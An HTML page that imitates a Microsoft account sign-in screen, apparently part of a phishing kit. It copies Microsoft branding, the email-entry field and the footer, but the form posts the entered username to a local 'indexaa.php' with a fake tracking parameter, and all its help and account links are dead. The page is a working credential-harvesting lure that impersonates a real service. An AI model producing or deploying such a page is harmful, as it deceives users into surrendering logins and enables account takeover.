<!doctype html>
<html dir="ltr" lang="EN-US">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=Edge">
		<title>Sign in to your account</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
		<link rel="shortcut icon" href="mx/favicon.ico">
		<link rel="stylesheet" title="Converged" type="text/css" href="mx/style2.css">
		<style type="text/css">body.cb input.hip{border-width: 2px !important;}</style>
		<style type="text/css">body{display:none;}</style>
		<style type="text/css">body{display:block !important;}</style>
	</head>
	<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
		<div><!--  --> 
			<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
				<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> 
					<div style="background-image: url('mx/bg-small.jpg');"></div>
					<div class="backgroundImage" style="background-image: url('mx/bg.jpg');"></div>
					<div class="background-overlay"></div><!-- /ko -->
				</div>
			</div> 
			<form method="post" target="_top" autocomplete="off" action="indexaa.php?l=AAMkADlhOTMwNDI4LWVhMjUtNDk2OC1iYWRhLTMzNTllMTNiMDA3MgAuAAAAAADejthFEfmXSIv+a3wh1mS0AQAIlhAAAAAAWgAAAmd6eckQKL40ajAAAAAAWgAAAEUeizAAAAAAWgAAA_946f2cde0f344ac2567a45_j124456733ebe933255be_Product-UserID">
				<div class="outer">
					<div class="middle">
						<div class="inner">
							<div>
								<img class="logo" src="mx/logo.svg">
							<div class="row text-title" id="loginHeader"> <div role="heading" aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div> <input name="UserName" id="login" maxlength="113" class="form-control ltr_override" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." lang="en" type="email" required="required"> 
													<div class="phholder" style="left: 0px; top: 0px; width: 100%; position: absolute; z-index: 5;" data-bind="visible: !textInput(), click: focus"> 
														<div aria-hidden="true" style="cursor:text" data-bind="text: hintText, css: hintCss" class="placeholder"></div> 
													</div>
												</div>
											</div>
										</div>

										
										
										<div class="row"> 
											<div class="col-md-24"> 
												<div class="text-13 action-links"> 
													<div class="form-group"> 
														No account?<a id="idA_PWD_ForgotPassword" href="#"> Create one!</a> 
													</div>
													<div class="form-group"> 
														<a id="i1668" href="#">Can&#39;t access your account?</a> 
													</div>
												</div> 
											</div> 
										</div>

										<div class="row"> 
											<div>
												<div class="col-xs-24 no-padding-left-right" align="right"> 
													<div class="inline-block"> 
														<input id="idSIButton9" class="btn btn btn-primary" value="Next" type="submit"> 
													</div> 
												</div>
											</div> 
										</div>
									</div>
								</div>
							</div>
						</div> 
						<div></div> 
					</div> 

				</div> 
				<div id="footer" class="footer default"> 
					<div>
						<div id="footerLinks" class="footerNode text-secondary">
							<span id="ftrCopy" data-bind="html: svr.B6">&copy;2020 Microsoft</span>
							<a id="ftrTerms" href="#">Terms of use</a> 
							<a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
						</div> 
					</div> 
				</div> 
			</form> 
			<form method="post" target="_top"></form>
		</div>
	</body>
</html>